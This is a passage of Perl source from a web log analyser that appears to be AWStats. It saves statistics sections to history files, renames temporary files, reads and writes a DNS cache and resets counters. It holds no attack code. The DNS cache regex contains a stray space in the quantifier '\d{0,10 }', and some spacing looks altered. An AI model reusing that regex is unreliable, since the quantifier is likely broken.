            print HISTORYTMP "$_ " . int($_robot_h{$_})  . 
                             " " . int($_robot_k{$_}) .
                             " " . $_robot_l{$_} . 
                             " " . int($_robot_r{$_} || 0) . "\n";
        }
        foreach (keys %_robot_h ){
            if($keysinkeylist{$_}){
                next;
            }
            print HISTORYTMP "$_ " . int($_robot_h{$_}) . 
                             " " . int($_robot_k{$_}) . 
                             " " . $_robot_l{$_} . 
                             " " . int($_robot_r{$_} || 0) . "\n";
        }
        print HISTORYTMP "END_ROBOT\n";
    }
    if($sectiontosave eq 'worms'){
        print HISTORYTMP "\n";
        print HISTORYTMP "# Worm ID - Hits - Bandwidth - Last visit\n";
        print HISTORYTMP "# The $MaxNbOf{'WormsShown'} first Hits must ".
                         "be first (order not required for others)\n";
        $ValueInFile{$sectiontosave} = tell HISTORYTMP;
        print HISTORYTMP "BEGIN_WORMS " . (scalar keys %_worm_h) . "\n";

        # We save worm list in score sorted order to 
        # get a -output faster and with less use of memory.
        &BuildKeyList( $MaxNbOf{'WormsShown'}, $MinHit{'Worm'}, \%_worm_h, \%_worm_h );
        my %keysinkeylist = ();
        foreach (@keylist){
            $keysinkeylist{$_} = 1;
            print HISTORYTMP "$_ " . int($_worm_h{$_}) .
                             " " . int($_worm_k{$_}) .
                             " $_worm_l{$_}\n";
        }
        foreach (keys %_worm_h){
            if($keysinkeylist{$_}){
                next;
            }
            print HISTORYTMP "$_ " . int($_worm_h{$_}) . 
                             " " . int($_worm_k{$_}) . 
                             " $_worm_l{$_}\n";
        }
        print HISTORYTMP "END_WORMS\n";
    }
    if($sectiontosave eq 'emailsender'){
        print HISTORYTMP "\n";
        print HISTORYTMP "# EMail - Hits - Bandwidth - Last visit\n";
        print HISTORYTMP "# The $MaxNbOf{'EMailsShown'} first Hits ".
                         "must be first (order not required for others)\n";
        $ValueInFile{$sectiontosave} = tell HISTORYTMP;
        print HISTORYTMP "BEGIN_EMAILSENDER " . (scalar keys %_emails_h). "\n";

        # We save sender email list in score sorted order 
        # to get a -output faster and with less use of memory.
        &BuildKeyList($MaxNbOf{'EMailsShown'}, $MinHit{'EMail'}, \%_emails_h, \%_emails_h);
        my %keysinkeylist = ();
        foreach (@keylist){
            $keysinkeylist{$_} = 1;
            print HISTORYTMP "$_ " . int($_emails_h{$_} || 0) .
                             " " . int($_emails_k{$_} || 0) .
                             " $_emails_l{$_}\n";
        }
        foreach (keys %_emails_h){
            if($keysinkeylist{$_}){
                next;
            }
            print HISTORYTMP "$_ " . int($_emails_h{$_} || 0) .
                             " " . int($_emails_k{$_} || 0) .
                             " $_emails_l{$_}\n";
        }
        print HISTORYTMP "END_EMAILSENDER\n";
    }
    if($sectiontosave eq 'emailreceiver'){
        print HISTORYTMP "\n";
        print HISTORYTMP "# EMail - Hits - Bandwidth - Last visit\n";
        print HISTORYTMP "# The $MaxNbOf{'EMailsShown'} first hits ".
                         "must be first (order not required for others)\n";
        $ValueInFile{$sectiontosave} = tell HISTORYTMP;
        print HISTORYTMP "BEGIN_EMAILRECEIVER " . (scalar keys %_emailr_h) . "\n";

        # We save receiver email list in score sorted order to
        # get a -output faster and with less use of memory.
        &BuildKeyList($MaxNbOf{'EMailsShown'}, $MinHit{'EMail'}, \%_emailr_h, \%_emailr_h );
        my %keysinkeylist = ();
        foreach (@keylist){
            $keysinkeylist{$_} = 1;
            print HISTORYTMP "$_ " . int($_emailr_h{$_} || 0) .
                             " " . int($_emailr_k{$_} || 0) .
                             " $_emailr_l{$_}\n";
        }
        foreach (keys %_emailr_h){
            if ($keysinkeylist{$_}){
                next;
            }
            print HISTORYTMP "$_ " . int($_emailr_h{$_} || 0) . 
                             " " . int( $_emailr_k{$_} || 0 ) . 
                             " $_emailr_l{$_}\n";
        }
        print HISTORYTMP "END_EMAILRECEIVER\n";
    }

    # Navigation
    if($sectiontosave eq 'session'){
        # This section must be saved after VISITOR section is read
        print HISTORYTMP "\n";
        print HISTORYTMP "# Session range - Number of visits\n";
        $ValueInFile{$sectiontosave} = tell HISTORYTMP;
        print HISTORYTMP "BEGIN_SESSION " . (scalar keys %_session) . "\n";
        foreach (keys %_session){
            print HISTORYTMP "$_ " . int($_session{$_}) . "\n";
        }
        print HISTORYTMP "END_SESSION\n";
    }
    if($sectiontosave eq 'sider'){
        # This section must be saved after VISITOR section is read
        print HISTORYTMP "\n";
        print HISTORYTMP "# URL - Pages - Bandwidth - Entry - Exit\n";
        print HISTORYTMP "# The $MaxNbOf{'PageShown'} first Pages ".
                         "must be first (order not required for others)\n";
        $ValueInFile{$sectiontosave} = tell HISTORYTMP;
        print HISTORYTMP "BEGIN_SIDER " . (scalar keys %_url_p) . "\n";

        # We save page list in score sorted order to get 
        # a -output faster and with less use of memory.
        &BuildKeyList($MaxNbOf{'PageShown'}, $MinHit{'File'}, \%_url_p, \%_url_p);
        %keysinkeylist = ();
        foreach (@keylist){
            $keysinkeylist{$_} = 1;
            my $newkey = $_;
            # Because some targeted url were taped with 2 / 
            # (Ex: //rep//file.htm). We must keep http://rep/file.htm
            $newkey =~ s/([^:])\/\//$1\//g;
            print HISTORYTMP XMLEncodeForHisto($newkey) . 
                             " " . int($_url_p{$_} || 0) . 
                             " " . int($_url_k{$_} || 0) . 
                             " " . int($_url_e{$_} || 0) . 
                             " " . int($_url_x{$_} || 0) . "\n";
        }
        foreach (keys %_url_p){
            if ($keysinkeylist{$_}){
                next;
            }
            my $newkey = $_;
            # Because some targeted url were taped with 2 /
            # (Ex: //rep//file.htm). We must keep http://rep/file.htm
            $newkey =~ s/([^:])\/\//$1\//g;
            print HISTORYTMP XMLEncodeForHisto($newkey) . 
                             " " . int($_url_p{$_} || 0) . 
                             " " . int($_url_k{$_} || 0) . 
                             " " . int($_url_e{$_} || 0) . 
                             " " . int($_url_x{$_} || 0) . "\n";
        }
        print HISTORYTMP "END_SIDER\n";
    }
    if($sectiontosave eq 'filetypes'){
        print HISTORYTMP "\n";
        print HISTORYTMP "# Files type - Hits - Bandwidth - Bandwidth ".
                         "without compression - Bandwidth after compression\n";
        $ValueInFile{$sectiontosave} = tell HISTORYTMP;
        print HISTORYTMP "BEGIN_FILETYPES " . (scalar keys %_filetypes_h) . "\n";
        foreach (keys %_filetypes_h){
            my $hits        = $_filetypes_h{$_}      || 0;
            my $bytes       = $_filetypes_k{$_}      || 0;
            my $bytesbefore = $_filetypes_gz_in{$_}  || 0;
            my $bytesafter  = $_filetypes_gz_out{$_} || 0;
            print HISTORYTMP "$_ $hits $bytes $bytesbefore $bytesafter\n";
        }
        print HISTORYTMP "END_FILETYPES\n";
    }
    if($sectiontosave eq 'downloads'){
        print HISTORYTMP "\n";
        print HISTORYTMP "# Downloads - Hits - Bandwidth\n";
        $ValueInFile{$sectiontosave} = tell HISTORYTMP;
        print HISTORYTMP "BEGIN_DOWNLOADS " . (scalar keys %_downloads) . "\n";
        for my $u (sort {$_downloads{$b}->{'AWSTATS_HITS'} <=> $_downloads{$a}->{'AWSTATS_HITS'}}(keys %_downloads)){
            print HISTORYTMP XMLEncodeForHisto($u) . 
                             " " . XMLEncodeForHisto($_downloads{$u}->{'AWSTATS_HITS'} || 0) . 
                             " " . XMLEncodeForHisto($_downloads{$u}->{'AWSTATS_206'} || 0) . 
                             " " . XMLEncodeForHisto($_downloads{$u}->{'AWSTATS_SIZE'} || 0) ."\n";
        }
        print HISTORYTMP "END_DOWNLOADS\n";
    }
    if($sectiontosave eq 'os'){
        print HISTORYTMP "\n";
        print HISTORYTMP "# OS ID - Hits\n";
        $ValueInFile{$sectiontosave} = tell HISTORYTMP;
        print HISTORYTMP "BEGIN_OS " . (scalar keys %_os_h) . "\n";
        foreach (keys %_os_h){
            print HISTORYTMP "$_ $_os_h{$_}\n";
        }
        print HISTORYTMP "END_OS\n";
    }
    if($sectiontosave eq 'browser'){
        print HISTORYTMP "\n";
        print HISTORYTMP "# Browser ID - Hits\n";
        $ValueInFile{$sectiontosave} = tell HISTORYTMP;
        print HISTORYTMP "BEGIN_BROWSER " . (scalar keys %_browser_h) . "\n";
        foreach (keys %_browser_h){
            print HISTORYTMP "$_ $_browser_h{$_}\n";
        }
        print HISTORYTMP "END_BROWSER\n";
    }
    if($sectiontosave eq 'screensize'){
        print HISTORYTMP "\n";
        print HISTORYTMP "# Screen size - Hits\n";
        $ValueInFile{$sectiontosave} = tell HISTORYTMP;
        print HISTORYTMP "BEGIN_SCREENSIZE " . (scalar keys %_screensize_h) . "\n";
        foreach (keys %_screensize_h){
            print HISTORYTMP "$_ $_screensize_h{$_}\n";
        }
        print HISTORYTMP "END_SCREENSIZE\n";
    }

    # Referer
    if($sectiontosave eq 'unknownreferer'){
        print HISTORYTMP "\n";
        print HISTORYTMP "# Unknown referer OS - Last visit date\n";
        $ValueInFile{$sectiontosave} = tell HISTORYTMP;
        print HISTORYTMP "BEGIN_UNKNOWNREFERER " . (scalar keys %_unknownreferer_l) . "\n";
        foreach (keys %_unknownreferer_l){
            print HISTORYTMP XMLEncodeForHisto($_) . " $_unknownreferer_l{$_}\n";
        }
        print HISTORYTMP "END_UNKNOWNREFERER\n";
    }
    if($sectiontosave eq 'unknownrefererbrowser'){
        print HISTORYTMP "\n";
        print HISTORYTMP "# Unknown referer Browser - Last visit date\n";
        $ValueInFile{$sectiontosave} = tell HISTORYTMP;
        print HISTORYTMP "BEGIN_UNKNOWNREFERERBROWSER " . (scalar keys %_unknownrefererbrowser_l) . "\n";
        foreach (keys %_unknownrefererbrowser_l){
            print HISTORYTMP XMLEncodeForHisto($_) . " $_unknownrefererbrowser_l{$_}\n";
        }
        print HISTORYTMP "END_UNKNOWNREFERERBROWSER\n";
    }
    if($sectiontosave eq 'origin'){
        print HISTORYTMP "\n";
        print HISTORYTMP "# Origin - Pages - Hits \n";
        $ValueInFile{$sectiontosave} = tell HISTORYTMP;
        print HISTORYTMP "BEGIN_ORIGIN 6\n";
        print HISTORYTMP "From0 " . int($_from_p[0]) . " " . int($_from_h[0]) . "\n";
        print HISTORYTMP "From1 " . int($_from_p[1]) . " " . int($_from_h[1]) . "\n";
        print HISTORYTMP "From2 " . int($_from_p[2]) . " " . int($_from_h[2]) . "\n";
        print HISTORYTMP "From3 " . int($_from_p[3]) . " " . int($_from_h[3]) . "\n";
        print HISTORYTMP "From4 " . int($_from_p[4]) . " " . int($_from_h[4]) . "\n"; # Same site
        print HISTORYTMP "From5 " . int($_from_p[5]) . " " . int($_from_h[5]) . "\n"; # News
        print HISTORYTMP "END_ORIGIN\n";
    }
    if($sectiontosave eq 'sereferrals'){
        print HISTORYTMP "\n";
        print HISTORYTMP "# Search engine referers ID - Pages - Hits\n";
        $ValueInFile{$sectiontosave} = tell HISTORYTMP;
        print HISTORYTMP "BEGIN_SEREFERRALS " . (scalar keys %_se_referrals_h) . "\n";
        foreach (keys %_se_referrals_h){
            print HISTORYTMP "$_ " . int($_se_referrals_p{$_} || 0) . 
                             " $_se_referrals_h{$_}\n";
        }
        print HISTORYTMP "END_SEREFERRALS\n";
    }
    if($sectiontosave eq 'pagerefs'){
        print HISTORYTMP "\n";
        print HISTORYTMP "# External page referers - Pages - Hits\n";
        print HISTORYTMP "# The $MaxNbOf{'RefererShown'} first Pages ".
                         "must be first (order not required for others)\n";
        $ValueInFile{$sectiontosave} = tell HISTORYTMP;
        print HISTORYTMP "BEGIN_PAGEREFS " . (scalar keys %_pagesrefs_h) . "\n";

        # We save page list in score sorted order to get
        # a -output faster and with less use of memory.
        &BuildKeyList($MaxNbOf{'RefererShown'}, $MinHit{'Refer'}, \%_pagesrefs_h, \%_pagesrefs_p);
        %keysinkeylist = ();
        foreach (@keylist){
            $keysinkeylist{$_} = 1;
            my $newkey = $_;
            # Remove / at end of http://.../ but not at end of http://.../dir/
            $newkey =~ s/^http(s|):\/\/([^\/]+)\/$/http$1:\/\/$2/i;
            print HISTORYTMP XMLEncodeForHisto($newkey) . 
                             " " . int($_pagesrefs_p{$_} || 0) . 
                             " $_pagesrefs_h{$_}\n";
        }
        foreach (keys %_pagesrefs_h){
            if($keysinkeylist{$_}){
                next;
            }
            my $newkey = $_;
            # Remove / at end of http://.../ but not at end of http://.../dir/
            $newkey =~ s/^http(s|):\/\/([^\/]+)\/$/http$1:\/\/$2/i;
            print HISTORYTMP XMLEncodeForHisto($newkey) . 
                             " " . int($_pagesrefs_p{$_} || 0) . 
                             " $_pagesrefs_h{$_}\n";
        }
        print HISTORYTMP "END_PAGEREFS\n";
    }
    if($sectiontosave eq 'searchwords'){
        # Save phrases section
        print HISTORYTMP "\n";
        print HISTORYTMP "# Search keyphrases - Number of search\n";
        print HISTORYTMP "# The $MaxNbOf{'KeyphrasesShown'} first number of ".
                         "search must be first (order not required for others)\n";
        $ValueInFile{$sectiontosave} = tell HISTORYTMP;
        print HISTORYTMP "BEGIN_SEARCHWORDS " . (scalar keys %_keyphrases) . "\n";
        # We will also build _keywords
        %_keywords = ();

        # We save key list in score sorted order to 
        # get a -output faster and with less use of memory.
        &BuildKeyList($MaxNbOf{'KeywordsShown'}, $MinHit{'Keyword'}, \%_keyphrases, \%_keyphrases );
        %keysinkeylist = ();
        foreach my $key (@keylist){
            $keysinkeylist{$key} = 1;
            my $keyphrase = $key;
            $keyphrase =~ tr/ /\+/s;
            print HISTORYTMP XMLEncodeForHisto($keyphrase) . 
                             " " . $_keyphrases{$key} . "\n";
            foreach (split( /\+/, $key)){
                $_keywords{$_} += $_keyphrases{$key};
            } # To init %_keywords
        }
        foreach my $key (keys %_keyphrases){
            if($keysinkeylist{$key}){
                next;
            }
            my $keyphrase = $key;
            $keyphrase =~ tr/ /\+/s;
            print HISTORYTMP XMLEncodeForHisto($keyphrase) . 
                             " " . $_keyphrases{$key} . "\n";
            foreach (split( /\+/, $key)){
                $_keywords{$_} += $_keyphrases{$key};
            } # To init %_keywords
        }
        print HISTORYTMP "END_SEARCHWORDS\n";

        # Now save keywords section
        print HISTORYTMP "\n";
        print HISTORYTMP "# Search keywords - Number of search\n";
        print HISTORYTMP "# The $MaxNbOf{'KeywordsShown'} first number of ".
                         "search must be first (order not required for others)\n";
        $ValueInFile{"keywords"} = tell HISTORYTMP;
        print HISTORYTMP "BEGIN_KEYWORDS " . (scalar keys %_keywords) . "\n";

        # We save key list in score sorted order to get 
        # a -output faster and with less use of memory.
        &BuildKeyList($MaxNbOf{'KeywordsShown'}, $MinHit{'Keyword'}, \%_keywords, \%_keywords);
        %keysinkeylist = ();
        foreach (@keylist){
            $keysinkeylist{$_} = 1;
            my $keyword = $_;
            print HISTORYTMP XMLEncodeForHisto($keyword) . 
                             " " . $_keywords{$_} . "\n";
        }
        foreach (keys %_keywords){
            if($keysinkeylist{$_}){
                next;
            }
            my $keyword = $_;
            print HISTORYTMP XMLEncodeForHisto($keyword) . 
                             " " . $_keywords{$_} . "\n";
        }
        print HISTORYTMP "END_KEYWORDS\n";
    }

    # Other - Errors
    if($sectiontosave eq 'cluster'){
        print HISTORYTMP "\n";
        print HISTORYTMP "# Cluster ID - Pages - Hits - Bandwidth\n";
        $ValueInFile{$sectiontosave} = tell HISTORYTMP;
        print HISTORYTMP "BEGIN_CLUSTER ". (scalar keys %_cluster_h). "\n";
        foreach (keys %_cluster_h){
            print HISTORYTMP "$_ " . int($_cluster_p{$_} || 0) . 
                             " " . int($_cluster_h{$_} || 0) . 
                             " " . int($_cluster_k{$_} || 0) . "\n";
        }
        print HISTORYTMP "END_CLUSTER\n";
    }
    if($sectiontosave eq 'misc'){
        print HISTORYTMP "\n";
        print HISTORYTMP "# Misc ID - Pages - Hits - Bandwidth\n";
        $ValueInFile{$sectiontosave} = tell HISTORYTMP;
        print HISTORYTMP "BEGIN_MISC " . (scalar keys %MiscListCalc) . "\n";
        foreach (keys %MiscListCalc){
            print HISTORYTMP "$_ " . int($_misc_p{$_} || 0) . 
                             " " . int($_misc_h{$_} || 0) . 
                             " " . int($_misc_k{$_} || 0) . "\n";
        }
        print HISTORYTMP "END_MISC\n";
    }
    if($sectiontosave eq 'errors'){
        print HISTORYTMP "\n";
        print HISTORYTMP "# Errors - Hits - Bandwidth\n";
        $ValueInFile{$sectiontosave} = tell HISTORYTMP;
        print HISTORYTMP "BEGIN_ERRORS " . (scalar keys %_errors_h) . "\n";
        foreach (keys %_errors_h){
            print HISTORYTMP "$_ $_errors_h{$_} " . int($_errors_k{$_} || 0) . "\n";
        }
        print HISTORYTMP "END_ERRORS\n";
    }
    if($sectiontosave eq 'webvisit'){
        print HISTORYTMP "\n";
        print HISTORYTMP "# Miss times - Hits tims - Bandwidth miss - Bandwidth hit\n";
        $ValueInFile{$sectiontosave} = tell HISTORYTMP;
        print HISTORYTMP "BEGIN_WEBVISIT 1\n";
        print HISTORYTMP ($_webagent_hits{'miss'} + $_webagent_hits{'-'}) . " $_webagent_hits{'hit'} " . 
            ($_webagent_bandwith{'miss'} + $_webagent_bandwith{'-'}) . " $_webagent_bandwith{'hit'}\n";
        print HISTORYTMP "END_WEBVISIT\n";
    }
    
    # Other - Trapped errors
    foreach my $code (keys %TrapInfosForHTTPErrorCodes){
        if($sectiontosave eq "sider_$code"){
            print HISTORYTMP "\n";
            print HISTORYTMP "# URL with $code errors - Hits - Last URL referer\n";
            $ValueInFile{$sectiontosave} = tell HISTORYTMP;
            print HISTORYTMP "BEGIN_SIDER_$code " . (scalar keys %_sider404_h) . "\n";
            foreach (keys %_sider404_h){
                my $newkey = $_;
                my $newreferer = $_referer404_h{$_} || '';
                print HISTORYTMP XMLEncodeForHisto($newkey) . 
                                 " $_sider404_h{$_} " . 
                                 XMLEncodeForHisto($newreferer) . "\n";
            }
            print HISTORYTMP "END_SIDER_$code\n";
        }
    }

    # Other - Extra stats sections
    foreach my $extranum (1 .. @ExtraName - 1){
        if($sectiontosave eq "extra_$extranum"){
            print HISTORYTMP "\n";
            print HISTORYTMP "# Extra key - Pages - Hits - Bandwidth - Last access\n";
            print HISTORYTMP "# The $MaxNbOfExtra[$extranum] first number of hits are first\n";
            $ValueInFile{$sectiontosave} = tell HISTORYTMP;
            print HISTORYTMP "BEGIN_EXTRA_$extranum " . 
                             scalar(keys %{'_section_' . $extranum . '_h'}) . "\n";
            &BuildKeyList($MaxNbOfExtra[$extranum], $MinHitExtra[$extranum],
                          \%{'_section_' . $extranum . '_h'},
                          \%{'_section_' . $extranum . '_p'});
            %keysinkeylist = ();
            foreach (@keylist){
                $keysinkeylist{$_} = 1;
                my $page       = ${'_section_' . $extranum . '_p' }{$_} || 0;
                my $bytes      = ${'_section_' . $extranum . '_k' }{$_} || 0;
                my $lastaccess = ${'_section_' . $extranum . '_l' }{$_} || '';
                print HISTORYTMP XMLEncodeForHisto($_) . " $page ",
                                 ${'_section_' . $extranum . '_h'}{$_},
                                 " $bytes $lastaccess\n";
                next;
            }
            foreach (keys %{'_section_' . $extranum . '_h'}){
                if($keysinkeylist{$_}){
                    next;
                }
                my $page       = ${ '_section_' . $extranum . '_p' }{$_} || 0;
                my $bytes      = ${ '_section_' . $extranum . '_k' }{$_} || 0;
                my $lastaccess = ${ '_section_' . $extranum . '_l' }{$_} || '';
                print HISTORYTMP XMLEncodeForHisto($_) . " $page ",
                                 ${'_section_' . $extranum . '_h'}{$_},
                                 " $bytes $lastaccess\n";
                next;
            }
            print HISTORYTMP "END_EXTRA_$extranum\n";
        }
    }

    # Other - Plugin sections
    if($AtLeastOneSectionPlugin && $sectiontosave =~ /^plugin_(\w+)$/i){
        my $pluginname = $1;
        if($PluginsLoaded{'SectionInitHashArray'}{"$pluginname"}){
            # my $function = "SectionWriteHistory_$pluginname(\$xml,\$xmlbb,".
            #                "\$xmlbs,\$xmlbe,\$xmlrb,\$xmlrs,\$xmlre,\$xmleb,\$xmlee)";
            # eval("$function");
            my $function = "SectionWriteHistory_$pluginname";
            &$function(0, '', ' ', '', '', ' ', '', '', '');
        }
    }

    %keysinkeylist = ();
}
#--------------------------------------------------------------------
# Function:     Rename all tmp history file into history
# Parameters:   None
# Input:        $DirData $PROG $FileSuffix
#               $KeepBackupOfHistoricFile $SaveDatabaseFilesWithPermissionsForEveryone
# Output:       None
# Return:       1 Ok, 0 at least one error (tmp files are removed)
#--------------------------------------------------------------------
sub Rename_All_Tmp_History
{
    my $pid      = $$;
    my $renameok = 1;

    opendir(DIR, "$DirData");
    my $datemask;
    if($DatabaseBreak eq 'month'){
        $datemask = '\d\d\d\d\d\d';
    }elsif($DatabaseBreak eq 'year'){
        $datemask = '\d\d\d\d';
    }elsif($DatabaseBreak eq 'day'){
        $datemask = '\d\d\d\d\d\d\d\d';
    }elsif($DatabaseBreak eq 'hour'){
        $datemask = '\d\d\d\d\d\d\d\d\d\d';
    }

    my $regfilesuffix = quotemeta($FileSuffix);
    foreach (grep /^$PROG($datemask)$regfilesuffix\.tmp\.$pid$/, file_filt sort readdir DIR){
        /^$PROG($datemask)$regfilesuffix\.tmp\.$pid$/;
        if($renameok){ # No rename error yet
            if(-s "$DirData/$PROG$1$FileSuffix.tmp.$$"){
                # Rename tmp files if size > 0
                if($KeepBackupOfHistoricFiles){
                    if(-s "$DirData/$PROG$1$FileSuffix.txt"){
                        # History file already exists. We backup it
                        # if(FileCopy("$DirData/$PROG$1$FileSuffix.txt", "$DirData/$PROG$1$FileSuffix.bak")){
                        if(rename("$DirData/$PROG$1$FileSuffix.txt", "$DirData/$PROG$1$FileSuffix.bak") == 0){
                            warning("Warning: Failed to make a backup of \"$DirData/$PROG$1$FileSuffix.txt\" ".
                                    "into \"$DirData/$PROG$1$FileSuffix.bak\".");
                        }
                        if($SaveDatabaseFilesWithPermissionsForEveryone){
                            chmod 0666, "$DirData/$PROG$1$FileSuffix.bak";
                        }
                    }else{
                        # debug
                    }
                }
                if(rename("$DirData/$PROG$1$FileSuffix.tmp.$$", "$DirData/$PROG$1$FileSuffix.txt") == 0){
                    $renameok =0; # At least one error in renaming working files
                    # Remove tmp file
                    unlink "$DirData/$PROG$1$FileSuffix.tmp.$$";
                    warning("Warning: Failed to rename \"$DirData/$PROG$1$FileSuffix.tmp.$$\" ".
                            "into \"$DirData/$PROG$1$FileSuffix.txt\".\nWrite permissions on ".
                            "\"$PROG$1$FileSuffix.txt\" might be wrong" . 
                            ($ENV{'GATEWAY_INTERFACE' } ? " for an 'update from web'" : "") .
                            " or file might be opened.");
                    next;
                }
                if($SaveDatabaseFilesWithPermissionsForEveryone){
                    chmod 0666, "$DirData/$PROG$1$FileSuffix.txt";
                }
            }
        }
        else {
            # Because of rename error, we remove all remaining tmp files
            unlink "$DirData/$PROG$1$FileSuffix.tmp.$$";
        }
    }
    close DIR;
    return $renameok;
 }

#------------------------------------------------------------------------------
# Function:     Load DNS cache file entries into a memory hash array
# Parameters:    Hash array ref to load into,
#               File name to load,
#                File suffix to use
#               Save to a second plugin file if not up to date
# Input:        None
# Output:        Hash array is loaded
# Return:        1 No DNS Cache file found, 0 OK
#------------------------------------------------------------------------------
sub Read_DNS_Cache
{
    my $hashtoload   = shift;
    my $dnscachefile = shift;
    my $filesuffix   = shift;
    my $savetohash   = shift;
    my $dnscacheext = '';
    my $filetoload  = '';
    my $timetoload  = time();

    if($dnscachefile =~ s/(\.\w+)$//){
        $dnscacheext = $1;
    }
    foreach my $dir ("$DirData", ".", ""){
        my $searchdir = $dir;
        if($searchdir && (!($searchdir =~ /\/$/))
           && (!($searchdir =~ /\\$/))){
            $searchdir .= "/";
        }
        if(-f "${searchdir }$dnscachefile$filesuffix$dnscacheext"){
            $filetoload = "${searchdir }$dnscachefile$filesuffix$dnscacheext";
        }

        # Plugin call : Change filetoload
        if($PluginsLoaded{'SearchFile' }{'hashfiles' }){
            SearchFile_hashfiles($searchdir,   $dnscachefile, $filesuffix,
                                 $dnscacheext, $filetoload);
        }
        if($filetoload){
            last;
        } # We found a file to load
    }

    if(!$filetoload){
        return 1;
    }

    # Plugin call : Load hashtoload
    if($PluginsLoaded{'LoadCache' }{'hashfiles' }){
        LoadCache_hashfiles($filetoload, $hashtoload);
    }
    if(!scalar keys %$hashtoload){
        open(DNSFILE, "$filetoload")
            or error("Couldn't open DNS Cache file \"$filetoload\": $!");
        #binmode DNSFILE;
        # If we set binmode here, it seems that the load is broken on ActiveState 5.8
        # This is a fast way to load with regexp
        %$hashtoload = map(/^(?:\d{0,10 }\s+)?([0-9A-F:\.]+)\s+([^\s]+)$/oi, <DNSFILE>);
        close DNSFILE;
        if($savetohash){
            # Plugin call : Save hash file (all records) with test if up to date to save
            if($PluginsLoaded{'SaveHash' }{'hashfiles' }){
                SaveHash_hashfiles($filetoload, $hashtoload, 1, 0);
            }
        }
    }
    return 0;
 }

#------------------------------------------------------------------------------
# Function:     Save a memory hash array into a DNS cache file
# Parameters:    Hash array ref to save,
#               File name to save,
#                File suffix to use
# Input:        None
# Output:        None
# Return:        0 OK, 1 Error
#------------------------------------------------------------------------------
sub Save_DNS_Cache_File
{
    my $hashtosave   = shift;
    my $dnscachefile = shift;
    my $filesuffix   = shift;
    my $dnscacheext    = '';
    my $filetosave     = '';
    my $timetosave     = time();
    my $nbofelemtosave = $NBOFLASTUPDATELOOKUPTOSAVE;
    my $nbofelemsaved  = 0;

    if(!scalar keys %$hashtosave){
        return 0;
    }
    if($dnscachefile =~ s/(\.\w+)$//){ $dnscacheext = $1; }
    $filetosave = "$dnscachefile$filesuffix$dnscacheext";

    # Plugin call : Save hash file (only $NBOFLASTUPDATELOOKUPTOSAVE records) with no test if up to date
    if($PluginsLoaded{'SaveHash' }{'hashfiles' }){
        SaveHash_hashfiles($filetosave, $hashtosave, 0, $nbofelemtosave, $nbofelemsaved);
        if($SaveDatabaseFilesWithPermissionsForEveryone){
            chmod 0666, "$filetosave";
        }
    }
    if(!$nbofelemsaved){
        $filetosave = "$dnscachefile$filesuffix$dnscacheext";
        if(!open(DNSFILE, ">$filetosave")){
            warning("Warning: Failed to open for writing last update DNS Cache file \"$filetosave\": $!");
            return 1;
        }
        binmode DNSFILE;
        my $starttimemin = int($starttime / 60);
        foreach my $key (keys %$hashtosave){
            #if($hashtosave->{$key } ne '*') {
            my $ipsolved = $hashtosave->{$key };
            # Change 'ip' to '*' for backward compatibility
            print DNSFILE "$starttimemin\t$key\t" .
                          ($ipsolved eq 'ip' ? '*' : $ipsolved) . "\n";    
            if(++$nbofelemsaved >= $NBOFLASTUPDATELOOKUPTOSAVE){
                last;
            }
        }
        close DNSFILE;

        if($SaveDatabaseFilesWithPermissionsForEveryone) {
            chmod 0666, "$filetosave";
        }

    }
    return 0;
 }

#------------------------------------------------------------------------------
# Function:     Return time elapsed since last call in miliseconds
# Parameters:    0|1 (0 reset counter, 1 no reset)
# Input:        None
# Output:        None
# Return:        Number of miliseconds elapsed since last call
#------------------------------------------------------------------------------
sub GetDelaySinceStart
{
    if(shift){ # Reset chrono
        $StartSeconds = 0;
    }

    # Plugin call : Return seconds and milliseconds
    my ($newseconds, $newmicroseconds) = (time(), 0);
    if($PluginsLoaded{'GetTime'}{'timehires'}){
        GetTime_timehires($newseconds, $newmicroseconds);
    }
    if(!$StartSeconds){
        $StartSeconds      = $newseconds;
        $StartMicroseconds = $newmicroseconds;
    }
    return (($newseconds - $StartSeconds) * 1000 +
           int(($newmicroseconds - $StartMicroseconds) / 1000));
 }

#------------------------------------------------------------------------------
# Function:     Reset all variables whose name start with _ because a new month start
# Parameters:    None
# Input:        $YearRequired All variables whose name start with _
# Output:       All variables whose name start with _
# Return:        None
#------------------------------------------------------------------------------
sub Init_HashArray
{
    # Reset global hash arrays
    %FirstTime           = %LastTime           = ();
    %MonthHostsKnown     = %MonthHostsUnknown  = ();
    %MonthVisits         = %MonthUnique        = ();
    %MonthPages          = %MonthHits          = %MonthBytes = ();
    %MonthNotViewedPages = %MonthNotViewedHits = %MonthNotViewedBytes = ();
    %DayPages            = %DayHits            = %DayBytes = %DayVisits = ();

    # Reset all arrays with name beginning by _
    for(my $ix = 0; $ix < 6; $ix++){
        $_from_p[$ix] = 0;
        $_from_h[$ix] = 0;
    }
    for(my $ix = 0; $ix < 24; $ix++){
        $_time_h[$ix]    = 0;
        $_time_k[$ix]    = 0;
        $_time_p[$ix]    = 0;
        $_time_nv_h[$ix] = 0;
        $_time_nv_k[$ix] = 0;
        $_time_nv_p[$ix] = 0;
    }

    # Reset all hash arrays with name beginning by _
    %_session     = %_browser_h   = %_errors_k   = ();
    %_domener_p   = %_domener_h   = %_domener_k  = ();
    %_host_p      = %_host_h      = %_host_k     = ();
    %_host_l      = %_host_s      = %_host_u     = ();
    %_keyphrases  = %_keywords    = %_os_h       = ();
    %_worm_h      = %_worm_k      = %_worm_l     = ();
    %_login_p     = %_login_h     = %_login_k    = ();
    %_url_p       = %_url_k       = %_url_e      = ();
    %_login_l     = %_robot_r     = %_url_x      = ();
    %_robot_h     = %_robot_k     = %_robot_l    = ();
    %_misc_p      = %_misc_h      = %_misc_k     = ();
    %_cluster_p   = %_cluster_h   = %_cluster_k  = ();
    %_emails_h    = %_emails_k    = %_emails_l   = ();
    %_emailr_h    = %_emailr_k    = %_emailr_l   = ();
    %_waithost_e  = %_waithost_l  = %_waithost_s = ();
    %_sider404_h  = %_downloads   = %_waithost_u = ();
    %_pagesrefs_p = %_pagesrefs_h = %_errors_h   = ();
    %_referer404_h     = %_screensize_h     =();
    %_filetypes_gz_in  = %_filetypes_gz_out = %_filetypes_h =();
    %_se_referrals_h   = %_se_referrals_p   = %_filetypes_k =();
    %_unknownreferer_l = %_unknownrefererbrowser_l =();
    %_webagent_hits    = %_webagent_bandwith = ();

    for(my $ix = 1 ; $ix < @ExtraName; $ix++){
        %{'_section_' . $ix . '_h'} = %{'_section_' . $ix . '_o'} =
        %{'_section_' . $ix . '_k'} = %{'_section_' . $ix . '_l'} =
        %{'_section_' . $ix . '_p'} = ();
    }
